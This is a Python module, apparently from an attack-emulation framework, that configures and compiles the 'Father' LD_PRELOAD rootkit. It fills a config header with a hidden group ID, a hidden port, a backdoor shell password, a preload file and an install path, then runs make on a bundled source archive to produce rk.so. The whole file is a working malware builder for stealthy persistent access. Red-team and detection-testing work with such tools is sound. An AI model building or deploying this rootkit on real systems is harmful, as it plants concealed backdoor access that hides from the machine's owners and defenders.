"""
fatherexecutor.py
============================================
Generates a binary for the father rootkit
"""

import platform
import subprocess
import tarfile
import os
import tempfile
from string import Template
from typing import Any
from .baseexecutor import BaseExecutor, Result
from .schemas import FatherCommand
from .variablestore import VariableStore


class FatherExecutor(BaseExecutor):
    def __init__(self, varstore: VariableStore, cmdconfig=None):
        self.tempfilestore: list[Any] = []
        super().__init__(varstore, cmdconfig)

    def set_config(self, command: FatherCommand, path: str):
        config = """
#ifndef CONFIG
#define CONFIG
#define GID $GID
#define SOURCEPORT $SOURCEPORT
#define EPOCH_TIME $EPOCH_TIME
#define ENV "$ENV_VAR"
#define STRING "$FILE_PREFIX"
#define PRELOAD "$PRELOAD_FILE"
#define HIDDENPORT "$HIDDENPORT"
#define SHELL_PASS "$SHELL_PASS"
#define INSTALL_LOCATION "$INSTALL_PATH"
#endif
"""
        template_vars = {
                         "GID": command.gid,
                         "SOURCEPORT": command.srcport,
                         "EPOCH_TIME": command.epochtime,
                         "ENV_VAR": command.env_var,
                         "FILE_PREFIX": command.file_prefix,
                         "PRELOAD_FILE": command.preload_file,
                         "HIDDENPORT": command.hiddenport,
                         "SHELL_PASS": command.shell_pass,
                         "INSTALL_PATH": command.install_path
                        }
        template = Template(config)
        with open(path, "w") as f:
            f.write(template.safe_substitute(template_vars))

    def log_command(self, command: FatherCommand):
        self.logger.info("Generating Father-Binary")

    def _exec_cmd(self, command: FatherCommand) -> Result:
        if platform.system() != "Linux":
            return Result("Compiling Father only works for Linux!", 1)

        data_path = os.path.join(os.path.dirname(__file__), 'data', 'Father.tar.gz')
        if command.local_path:
            father_path = command.local_path
        else:
            tmpfile = tempfile.TemporaryDirectory()
            self.tempfilestore.append(tmpfile)
            father_path = tmpfile.name
        tar = tarfile.open(data_path)
        tar.extractall(father_path)
        self.set_config(command, os.path.join(father_path, "Father", "src", "config.h"))
        result = subprocess.run("make",
                                shell=True,
                                cwd=os.path.join(father_path, "Father"),
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT)
        output = result.stdout.decode("utf-8", "ignore")

        if result.returncode != 0:
            self.logger.debug(result.stdout.decode("utf-8", "ignore"))
            if "include <security/pam_appl.h>" in result.stdout.decode("utf-8", "ignore"):
                output = "Error: Father requires libpam-dev!"
            if "fatal error: gcrypt.h: No such file or directory" in result.stdout.decode("utf-8", "ignore"):
                output = "Error: Father requires libgcrypt!"
            if "nasm: No such file or directory" in result.stdout.decode("utf-8", "ignore"):
                output = "Error: Father requires nasm!"
            if "gcc: No such file or directory" in result.stdout.decode("utf-8", "ignore"):
                output = "Error: Father requires gcc!"
        else:
            output = "Saved to " + os.path.join(father_path, "Father", "rk.so")
            self.varstore.set_variable("LAST_FATHER_PATH", os.path.join(father_path, "Father", "rk.so"))
        return Result(output, result.returncode)
